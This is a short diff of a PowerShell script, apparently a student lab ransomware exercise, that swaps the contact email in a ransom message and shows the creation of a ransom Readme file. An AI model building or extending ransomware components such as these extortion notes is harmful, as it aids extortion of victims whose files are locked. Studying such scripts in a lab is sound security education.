@@ -35,7 +35,7 @@ if ( Test-Path $newFile) {
 #>
 
 # Ransom message
-$msg = "If you want your files restored, please contact me at blaise.notter@mymail.champlain.edu. I look forward to doing business with you ;-)"
+$msg = "If you want your files restored, please contact me at username@protonmail.com. I look forward to doing business with you ;-)"
 
 # Create the Readme file
 $readme = "C:\Users\champuser\Desktop\Readme.READ"
